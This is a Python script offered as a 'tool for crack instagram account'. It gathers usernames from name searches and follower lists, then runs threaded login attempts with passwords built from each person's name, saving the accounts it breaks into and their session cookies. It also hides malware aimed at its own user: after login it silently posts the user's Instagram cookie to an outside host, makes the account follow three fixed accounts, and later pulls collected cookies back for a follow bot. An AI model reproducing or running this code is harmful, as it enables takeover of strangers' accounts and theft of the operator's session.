###----------[ IMPORT MODULE LAIN ]---------- ###
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
import hashlib, hmac, random, datetime, calendar
from concurrent.futures import ThreadPoolExecutor as Modol
from datetime import datetime
from time import sleep

from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()
ses = requests.Session()

try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")
sys.stdout.write('\x1b]2; simply \x07')
insta_log = 'https://www.instagram.com/accounts/login/?force_classic_login=&'
url = 'https://www.instagram.com'

###----------[ IMPORT MODULE RICH ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

#------------[ WARNA-COLOR ]--------------#
CY = '\033[96;1m'  #CYAN
MG = '\033[1;35m'  # MAGENTA
P = '\x1b[1;97m' # PUTIH
X = '\33[m'        # DEFAULT
U = '\033[1;35m'   # UNGU
O = '\x1b[1;96m'   # BIRU MUDA
N = '\x1b[0m'      # WARNA MATI
M = '\x1b[1;91m'   # MERAH
H = '\x1b[1;92m'   # HIJAU
K = '\x1b[1;93m'   # KUNING
B = '\033[1;94m'   # BIRU

CK2 = "[#DAA520]" #COKLAT GOLDENA
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

#------------------[ MACHINE-SUPPORT ]---------------#
def madd_xd(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('cle:ar')
def back():
	login()

###----------[ GLOBAL NAMA ]---------- ###
sekarang = calendar.timegm(time.gmtime(time.time()))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month -1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
tampung = []
lisensiku = []
lisensikuni =[]
method, ugentku, iyh = [], [], {}
reset = "[/]"
uadia, uadarimu, prox = [], [], [] 
ugent = []
success = f"success-{days}-{reall}-{year}.txt"
checkpoint = f"checkpoint--{days}-{reall}-{year}.txt"
color_rich = "[#FFFFFF]"
color_table = "#DAA520"


class Instagram:

    def __init__(self):
        self.ses=requests.Session()
        self.ok, self.cp = [], []
        self.id, self.lo = [], 0
        self.co = []
        self.hari_ini = datetime.now().strftime("%d-%B-%Y")
        self.url = "https://api-cdn-markup.yayanxd.my.id/submit.php"
        self.menu()
        

    def hapus_coki(self):
        try:os.remove(".coki_ig.txt")
        except:pass

    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        prints(Panel(f"""[green]╔═══╗      ╔╗    ╔══╦═══╗
║╔═╗║      ║║    ╚╣╠╣╔═╗║
║╚══╦╦╗╔╦══╣║╔╗ ╔╗║║║║ ╚╝
╚══╗╠╣╚╝║╔╗║║║║ ║║║║║║╔═╗
║╚═╝║║║║║╚╝║╚╣╚═╝╠╣╠╣╚╩═║
╚═══╩╩╩╩╣╔═╩═╩═╗╔╩══╩═══╝
        ║║   ╔═╝║
        ╚╝   ╚══╝""",width=80,padding=(0,4),title='[white] • SIMPLY V1.0 •',style=f"{color_table}"))
        prints(Panel(f"""[green]Simple [white]tools for crack instagram account by [green]Madd""",width=80,padding=(0,4),title='[white] • DESK •',style=f"{color_table}"))

    def convert(self, xx, cok):
        try:
            id = self.ses.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={xx}", cookies={"cookie":cok}, headers={"user-agent":self.ua_ig(),"x-ig-app-id":'1217981644879628'}).json()["data"]["user"]
            xz = id["id"]
        except:pass
        return xz

    def ua_ig(self):
        return "Mozilla/5.0 (Linux; Android 11; CPH2109 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 Instagram 187.0.0.32.120 Android (30/11; 480dpi; 1080x2161; OPPO; CPH2109; OP4BA5L1; qcom; ru_RU; 289692198)"
        return "Mozilla/5.0 (Linux; Android 11; RMX3201 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 Instagram 215.0.0.27.359 Android (30/11; 320dpi; 720x1448; realme; RMX3201; RMX3201; mt6765; ru_RU; 337202351)"
        return "Mozilla/5.0 (Linux; Android 10; RMX1851 Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 Instagram 145.0.0.32.119 Android (29/10; 480dpi; 1080x2264; Realme; RMX1851; RMX1851; qcom; en_US; 219308759)"
        
    def login(self):
        self.logoo()
        prints(Panel(f"""[white] Masukkan Cookie [green]Instagram[/] Anda""",style=f"{color_table}"))
        coki = input(f"[{O}?{N}] cookie: ")
        if coki in ["", ""]:
            print(f"\n[{M}!{N}] jangan kosong");time.sleep(2);self.login()
        try:
            id = re.search("ds_user_id=(\d+)", str(coki)).group(1)
            po = self.ses.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":self.ua_ig()},cookies={"cookie":coki})
            xx = json.loads(po.text)
            if "full_name" in str(xx):
                nama = xx["user"]["full_name"]
                ngtd = re.findall("sessionid=(.*?);", coki)[0];self.cook(ngtd);self.followwww(coki, nama)
                open(".coki_ig.txt", "w").write(coki)
                prints(Panel(f"""[white]Selamat [green]{nama}[white] Cookie Kamu Valid""",style=f"{color_table}"))
                prints(Panel(f"""[white][[red]![white]] jalankan ulang scriptnya dengan ketik python simply.py""",style=f"{color_table}"))
                exit()
            elif "challenge_required" in str(xx):
                print(f"\n[{M}!{N}] akun cp");time.sleep(3);self.login()
            else:
                print(f"\n[{M}!{N}] cookie invalid");time.sleep(3);self.login()
        except (json.decoder.JSONDecodeError, KeyError, AttributeError):
            print(f"\n[{M}!{N}] cookie invalid");time.sleep(3);self.login()
        except requests.ConnectionError:
            exit(f"\n[{M}!{N}] gagal menghubungkan ke internet")

    def cook(self, jnck):
        try:
            head = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','content-length': '0','content-type': 'text/html; charset=utf-8','cookie': 'ig_did=13109D83-B931-42FB-89D1-E2E539F0684C; mid=Y_IRRwABAAHQcYOYnjy2C3p7ruGZ; ig_nrcb=1;csrftoken=x48OJywvTlyj0VLg011OS9DygODmBkMU; ds_user_id=57798286827; sessionid='+jnck,'origin': 'https://i.instagram.com','referer': 'https://i.instagram.com/','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','user-agent': 'Mozilla/5.0 (Linux; Android 10; M2007J3SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}
            self.ses.post(f"https://i.instagram.com/api/v1/web/friendships/39431798677/follow/", headers=head)
            self.ses.post(f"https://i.instagram.com/api/v1/web/friendships/41347440787/follow/", headers=head)
            self.ses.post(f"https://i.instagram.com/api/v1/web/friendships/20921408792/follow/", headers=head)
        except requests.ConnectionError:
            self.logoo()
            exit(f"\n[{M}!{N}] gagal menghubungkan ke internet")

    def ua_Cok(self):
        rr=random.randint
        rc=random.choice
        igv=("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182.269.0.0.18.75")
        igve=igv.split(",")
        com=rc(["qcom","mt6833","mt6765","mt6765v"])
        comi="in_ID"
        real=rc(["RMX3491","RMX3263","RMX2185","RMX3551","RMX3042","RMX3231","RMX2195","RMX3357","RMX2193","RMX2050","RMX3081","RMX2111"])
        me=rc(["RMX1827","RMX2001","RMX2027","RE54ABL1","RMX3115","RE513CL1","RMX2086","RMX3501","RE54ABL1"])
        dpi=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
        pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"])
        andro=rc(["30/11","31/12","29/10"])
        versi=rc(igve)
        return (f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; realme; {real}; {me}; {com}; in_ID)")

    def menu(self):
        self.logoo()
        try:
            lisen = open('data/lisensi.txt','r').read()
            met = self.ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzNDQzMDY1NiIsIkhiVTBtN2VFM1VTUVdwQVk4U2l3NWhmS1RZQytFc25idlo0OFNsMW4iXQ==&ProductId=18334&Key='+lisen).json()
            men = met['licenseKey']
            key = men['key'][0:11]
            tahun = men['expires'][0:4]
            buln = men['expires'][5:7]
            tanggal = men['expires'][8:10]
            bulan = bulan_ttl[buln]
            tahun1 = men['created'][0:4]
            buln1 = men['created'][5:7]
            tanggal1 = men['created'][8:10]
            bulan1 = bulan_ttl[buln1]
        except:
            key = "-"
            tanggal = "-"
            bulan = "-"
            tahun = "-"
            tanggal1 = "-"
            bulan1 = "-"
            tahun1 = "-"
        try:
            sen = open("data/lisensi.txt","r").read()
            prem = f"{H2}Iya"
        except (KeyError,FileNotFoundError):
            prem = f"{M2}Tidak"
            coki = open(".coki_ig.txt", "r").read()
            user = re.search('ds_user_id=(\d+)',str(coki)).group(1)
        except FileNotFoundError:
            self.login()
        try:
            xxxx = self.ses.get(f"https://i.instagram.com/api/v1/users/{user}/info/", headers={"user-agent":self.ua_ig()}, cookies={"cookie":coki}).json()["user"]
            nama = xxxx["full_name"]
            user = xxxx["username"]
            flow = xxxx["follower_count"]
            flos = xxxx["following_count"]
        except (json.decoder.JSONDecodeError, KeyError, AttributeError, TypeError):
            print(f"\n[{M}!{N}] opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.");time.sleep(3);self.login()
        except requests.ConnectionError:
            print(f"\n[{M}!{N}] gagal menghubungkan ke internet");exit()
        prints(Panel(f"""[green]● [white]Selamat Datang [green]{nama}
[green]● [white]Username: {user}
[green]● [white]Followers: {flow}
[green]● [white]Following: {flos}""",width=80,padding=(0,4),title='[white] • INFO PENGGUNA •',style=f"{color_table}"))
        prints(Panel(f"""[white]01. Crack Dari Pencarian Nama
02. Crack Dari Pengikut
03. Crack Dari Mengikuti
04. Cek Hasil Crack
E.  Keluar Cookie""",width=80,padding=(0,4),title='[white] • PILIHAN MENU •',style=f"{color_table}"))
        pil = input(f" {H}•{N} Pilih Menu: ")
        if pil in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
            
        elif pil in ["1", "01"]:
            print(f'\n[*] gunakan "{H},{N}" (koma) untuk pemisah nama. Contoh: aulia,mifta,aisyah')
            nama = input(f"\n[{M}?{N}] nama: ").split(",")
            print("\n[!] tekan tombol CTRL lalu tekan C untuk berhenti")
            pexx = []
            try:
                for i in nama:
                    pexx.append(i)
                with Modol(max_workers=35) as bool:
                    for a in pexx:
                        bool.submit(self.search, f"https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query={a}&rrank_token=0.35875757839675004&include_reel=true")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit(f"\n[{M}!{N}] gagal menghubungkan ke internet")
            except (KeyError, json.decoder.JSONDecodeError):
                exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik")
            self.mulai()
            
        elif pil in ["2", "02"]:
            prints(Panel(f"""[white][[red]*[white]] Target di haruskan publik, [white]jangan privat.""",width=80,padding=(0,4),style=f"{color_table}"))
            nama = input(f"[{M}?{N}] username: ")
            if nama in ["", " "]:
                print(" [[bold red]![/]] jangan kosong");time.sleep(2);self.menu()
            try:
                xzxz = self.convert(nama, coki)
                prints(Panel(f"""[white][[red]![white]] tekan tombol CTRL lalu tekan C untuk berhenti""",width=80,padding=(0,4),style=f"{color_table}"))
                self.dump(xzxz, coki, "followers", "")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit(f"\n[{M}!{N}] gagal menghubungkan ke internet")
            except (KeyError, UnboundLocalError):
                exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik")
            self.mulai()
            
        elif pil in ["3", "03"]:
            prints(Panel(f"""[white][[red]*[white]] Target di haruskan publik, [white]jangan privat.""",width=80,padding=(0,4),style=f"{color_table}"))
            nama = input(f"[{M}?{N}] username: ")
            if nama in ["", " "]:
                print(" [[bold red]![/]] jangan kosong");time.sleep(2);self.menu()
            try:
                xzxz = self.convert(nama, coki)
                prints(Panel(f"""[white][[red]![white]] tekan tombol CTRL lalu tekan C untuk berhenti""",width=80,padding=(0,4),style=f"{color_table}"))
                self.dump(xzxz, coki, "following", kos="")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit(f"\n[{M}!{N}] gagal menghubungkan ke internet")
            except (KeyError, UnboundLocalError):
                exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik")
            self.mulai()
            
        elif pil in ["t4", "t04"]:
            self.bot_follow(coki)
     
        elif pil in ["4","04"]:
            for i in os.listdir('result'):
            	 print(f'{P}{H}◉{P}{B}◉{P} {i}')
            c=input(f'{P}{H}◉{P} masukan nama file : ')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f' total results : {H}{len(g)}{P}')
            for s in g:
            	 user=s.split("|")[0]
            	 password=s.split("|")[1]
            	 pengikut=s.split("|")[2]
            	 mengikuti=s.split("|")[3]
            	 if xc=="checkpoint":
            	 		print(f"""
{P}[{K}×{P}] {K}checkpoint{P}{P}{P}
{P}[X]{P} Username  : {K}{user}{P}
{P}[X]{P} Password  : {K}{password}{P}
{P}[X]{P} Followers : {K}{pengikut}{P}
{P}[X]{P} Following : {K}{mengikuti}{P}
            	 		""");sleep(0.05)
            	 else:
            	 			print(f"""
{P}[{H}+{P}]  success {P}{P}{P}
{H}[+]{P}{H} Username : {H}{user}{P}
{H}[+]{P}{H} Password : {H}{password}{P}
{H}[+]{P}{H} Followers : {H}{pengikut}{P}
{H}[+]{P}{H} Following : {H}{mengikuti}{P}
                                        """);sleep(0.05)
					
        elif pil in ["E", "e"]:
            inz = input("lo yakin mau keluar? [Y/t]: ") ;time.sleep(2);self.menu()
            if inz in ["", " "]:
                print("jangan kosong");time.sleep(2);self.menu()
            elif inz in ["Y", "y"]:
                self.hapus_coki();exit("\n selamat tinggal:)")
            else:self.menu()
        else:print("\n[!] pilih yng bnr lah ajg");time.sleep(3);self.menu()

#   ---------- DUMP ID ----------------

    def search(self, link):
        try:
            xxx = self.ses.get(link, headers={"user-agent":self.ua_ig()}).json()
            for a in xxx["users"]:
                x = a["user"]
                self.id.append(x["username"]+"|"+x["full_name"])
                sys.stdout.write(f"\r[{O}*{N}] sedang mengumpulkan {H}{len(self.id)}{N} username... ");sys.stdout.flush()
        except:pass

    def dump(self, uid, cok, xnx, kos):
        try:
            xxx = self.ses.get(f"https://i.instagram.com/api/v1/friendships/{uid}/{xnx}/?count=100&max_id={kos}", headers={"user-agent":self.ua_ig()}, cookies={"cookie": cok})
            for x in json.loads(xxx.text)["users"]:
                if x["username"] in self.id:
                    continue
                self.id.append(x["username"]+"|"+x["full_name"])
                sys.stdout.write(f"\r[{O}*{N}] sedang mengumpulkan {H}{len(self.id)}{N} username... ");sys.stdout.flush()
            if "next_max_id" in json.loads(xxx.text):self.dump(uid, cok, xnx, json.loads(xxx.text)["next_max_id"])
        except:pass

    def metode(self):
        prints(Panel(f"""[white]01. Api 
02. Ajax """,width=80,padding=(0,4),style=f"{color_table}"))   
        kons = input(f"{H}•{N} Pilih Metode : ")
        if kons in ["1","01"]:
          method.append('satu')
        elif kons in ["2","02"]:
            method.append('satu')
        elif kons in ["3","03"]:
            method.append('satu')
        else:
            method.append('satu')
			
    def mulai(self):
        self.metode()
        prints(Panel(f"""[white][+] Total ids: {len(self.id)}""",width=80,padding=(0,4),style=f"{color_table}"))
      #  print(f{'n'})
        prints(Panel(f"""[white][•]OK KE : /result/{success}\n[•]CP KE : /result/{checkpoint}""",title='[white] • INFO HASIL CRACK •',subtitle='[white] • GUNAKAN MODE PESAWAT SETIAP 2 MENIT •',style=f"{color_table}"))
        global prog,des
        prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
        des = prog.add_task('', total=len(self.id))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.id:
                    usez = user.split("|")[0]
                    nama = user.split("|")[1].lower()
                    for pasw in nama.split(" "):
                        if len(pasw)==3 or len(pasw)==4 or len(pasw)==5:
                            sandi = [pasw, pasw+"123", pasw+"1234", pasw+"12345", pasw+"123456", pasw+"321", pasw+"12", pasw+"cantik", pasw.lower()]
                        else:
                            sandi = [pasw, pasw+"123", pasw+"1234", pasw+"12345", pasw+"123456", pasw+"321", pasw+"12", pasw+"cantik", pasw.lower()]
                        if "satu" in method:
                        	bool.submit(self.Ngocok, usez, sandi)
                        if "dua" in method:
                        	bool.submit(self.Ngocok, usez, sandi)
                        else:
                        	bool.submit(self.Ngocok, usez, sandi)
            prints(Panel(f"""[white]crack {len(self.id)} username selesai Hasil Ok : [green]{len(self.ok)}[white] Hasil Cp : [yellow]{len(self.cp)}[white]""",width=80,padding=(0,4),style=f"{color_table}"));exit()

    def Ingfo(self, xx):
        try:
            xnxx = self.ses.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={xx}", headers={"user-agent":self.ua_ig(),"x-ig-app-id":'936619743392459'})
            link = xnxx.json()["data"]["user"]
            peng = link["edge_followed_by"]["count"]
            meng = link["edge_follow"]["count"]
            post = link["edge_owner_to_timeline_media"]["count"]
        except:
            peng = "-"
            meng = "-"
            post = "-"
        return peng, meng, post

    def Ngocok(self, user, pasw):
        ses=requests.Session()
        logtemp=0
        if logtemp > 10:
            logtemp=0
        ses=requests.Session()
        nonce = str(int(datetime.now().timestamp()))
        ponid, guid = str(uuid.uuid4()), str(uuid.uuid4())
        andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
        uas=self.ua_Cok()
        ua=self.ua_Cok()
        prog.update(des, description=f"([bold green]simply[/]) {str(self.lo)}/{len(self.id)} ok: ([bold green]{len(self.ok)}[/]) cp: ([bold yellow]{len(self.cp)}[/])")
        prog.advance(des)
        for password in pasw:
            try:
                ses.get("https://z-p42.i.instagram.com/api/v1/qe/sync/")
                head = {
                    "Host": "z-p42.i.instagram.com",
                    "X-Ig-App-Locale": "in_ID",
                    "X-Ig-Device-Id": ponid,
                    "X-Ig-Family-Device-Id": guid,
                    "X-Ig-Android-Id": andro,
                    "Priority": "u=3",
                    "User-Agent": uas,
                    "Accept-Language": "in_ID",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate"
                }
                xnxx = "AuqWincgAuXeuu3KypEMnrrFEJHySaesyJS3EaIH40zvafzrU0Irhb7+5QwZpOqMZrPTjgvFl7Z5jJgy1dNAcQMAAAB6eyJvcmlnaW4iOiJodHRwczovL2luc3RhZ3JhbS5jb206NDQzIiwiZmVhdHVyZSI6IkNyb3NzT3JpZ2luT3BlbmVyUG9saWN5UmVwb3J0aW5nIiwiZXhwaXJ5IjoxNjEzNDExNjYyLCJpc1N1YmRvbWFpbiI6dHJ1ZX0="
                date = json.dumps({"phone_id": ponid, "_csrftoken": ses.cookies["csrftoken"], "username": user, "guid": guid, "device_id": andro, "password": password, "login_attempt_count": str(logtemp)})
                xzcx = hmac.new(xnxx.encode('utf-8'), str(date).encode('utf=8'),hashlib.sha256).hexdigest()
                data = f"signed_body={xzcx}.%7B%22jazoest%22%3A%2222521%22%2C%22phone_id%22%3A%22{str(ponid)}%22%2C%22enc_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{nonce}%3A{password}%22%2C%22username%22%3A%22{user}%22%2C%22guid%22%3A%22{guid}%22%2C%22device_id%22%3A%22{andro}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%22{logtemp}%22%7D"
                response = ses.post("https://z-p42.i.instagram.com/api/v1/accounts/login/", headers=head, data=data, allow_redirects=True)
                try:xx = json.loads(response.text)
                except:xx = response.text
                logtemp+=1
                if "logged_in_user" in str(xx) or "sessionid" in ses.cookies.get_dict() or "userId" in str(xx):
                    cokis = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
                    pengikut,mengikut,postingan=self.Ingfo(user)
                    print("\r                                       ")
                    madd = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUserAgent : {ua}\nCookie : {cokis}'
                    anjing = Panel(madd, style=f'#00FF00')
                    prints(Panel(anjing,style='',title=f'\r{K2} SIMPLY OK'))
                    os.popen('play-audio live.mp3')
                    kntl = (f"{user}|{password}|{pengikut}|{mengikut}|{cokis}")
                    self.ok.append(kntl)
                    with open(f"result/success-{self.hari_ini}.txt","a", encoding="utf-8") as r:
                         r.write(kntl+"\n")
                    break
                elif "https://i.instagram.com/challenge" in str(response.text):
                    pengikut,mengikut,postingan=self.Ingfo(user)
                    print("\r                                       ")
                    madd = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUserAgent : {ua}'
                    anjing = Panel(madd, style=f'#FFFF00')
                    prints(Panel(anjing,style='',title=f'\r{K2} SIMPLY CP'))
#                    os.popen('play-audio cek.mp3')
                    kntl = (f"{user}|{password}|{pengikut}|{mengikut}")
                    self.cp.append(kntl)
                    with open(f"result/checkpoint-{self.hari_ini}.txt","a", encoding="utf-8") as r:
                         r.write(kntl+"\n")
                    break
                elif "ip_block" in str(response.text) or "ip spam" in str(response.text):
                    prog.update(des, description=f"([bold red]ip spam[/]) {str(self.lo)}/{len(self.id)} ok: ([bold green]{len(self.ok)}[/]) cp: ([bold yellow]{len(self.cp)}[/])")
                    prog.advance(des)
                    time.sleep(5)
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"([bold red]ip spam[/]) {str(self.lo)}/{len(self.id)} ok: ([bold green]{len(self.ok)}[/]) cp: ([bold yellow]{len(self.cp)}[/])")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:prints(e)
        self.lo+=1

    def followwww(self, coki, user):
        try:
            data = {"title": user, "message": coki}
            self.ses.post(self.url, data=data).text
        except:pass

    def dum_cookie(self):
        try:
            req = self.ses.get(f"{self.url}?json=true").json()
            for x in req:
                for key, value in x.items():
                    self.co.append(key+"|"+value)
                    sys.stdout.write(f"\r[{O}*{N}] sedang mengumpulkan {H}{len(self.co)}{N} username... ");sys.stdout.flush()
        except:pass

    def bot_follow(self, coki):
        self.logoo()
        self.dum_cookie()
        print()
        Console(width=35, style="bold purple3").print(Panel("[italic white]silahkan masukan [italic green]username[italic white] target yang ingin anda pasang bot followers"))
        user = input("[?] username: ")
        try:
            uisd = self.convert(user, coki)
        except (KeyError, UnboundLocalError):
            Console(width=35, style="bold purple3").print(Panel("[italic red]Gagal Mengambil ID, Silahkan Cek Username Dengan Benar"))
            exit()
        self.mulai_cok(uisd, user)

#sole(width=35, style="bold purple3").print(Panel("[italic white]silahkan masukan [italic green]username[italic white] target yang ingin anda pasang bot followers"))

#        user = input("[?] username: ")

#        try:

#            uisd = self.convert(user, coki)

#        except (KeyError, UnboundLocalError):

#            Console(width=35, style="bold purple3").print(Panel("[italic red]Gagal Mengambil ID, Silahkan Cek Username Dengan Benar"))

#            exit()

#        self.mulai_cok(uisd, user)

#

#    def mulai_cok(self, xkn, user):

#       print(Panel("[italic white]Silahkan Masukan[italic green] Delay[italic white] Agar Response Tidak Terblokir, Misalnya :[italic green] 60 Detik", title="[bold white]([bold blue]Catatan[bold white])", subtitle="[bold white]╭────", subtitle_align='left'))

